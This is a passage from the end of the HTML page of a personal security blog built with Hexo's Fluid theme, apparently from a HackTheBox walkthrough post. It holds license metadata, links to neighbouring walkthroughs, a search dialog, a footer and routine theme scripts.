        <div class="license-meta-item">
          <div>Author</div>
          <div>World'sEnd</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>August 14, 2023</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/post/HackTheBox-Return.html" title="HTB Walkthrough - Return">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">HTB Walkthrough - Return</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/post/HackTheBox-RedCross.html" title="HTB Walkthrough - RedCross">
                        <span class="hidden-mobile">HTB Walkthrough - RedCross</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
